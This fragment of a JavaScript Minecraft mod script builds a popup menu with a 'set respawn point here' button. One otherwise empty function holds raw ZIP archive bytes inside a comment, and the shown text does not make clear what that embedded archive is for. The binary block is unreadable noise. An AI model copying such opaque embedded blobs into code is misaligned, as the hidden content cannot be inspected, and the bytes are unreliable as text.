            onClick: function(v) {
                Level.setSpawn(getPlayerX(), getPlayerY(), getPlayerZ());
                输出JS消息("已将复活点设置在你脚下位置.")
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function 外进程序() {
    /**
    PK    Ƒ	I��2�   �      ����������.txt5�K
    �P E�{���O�D[h�H�KiP�ieه�"_?�j��p4���0�;��{9ꢫ�no	��S�&�y��1LH$����E�u�]
    ɒ,��Y?Ʈa�oV���'���|W �Vz��nЭ���$�m�=�B+[Q
    k�R�r9
    ���8ƋbRTS*�锐��L�D��T-G�r!�B6� .cX��R!�p�4
    ��PK?     Ƒ	I��2�   �    $               ����������.txt
             �}�&��ew"��ew"��PK      `   �     
    */
}

调试输出("加载完毕", 1);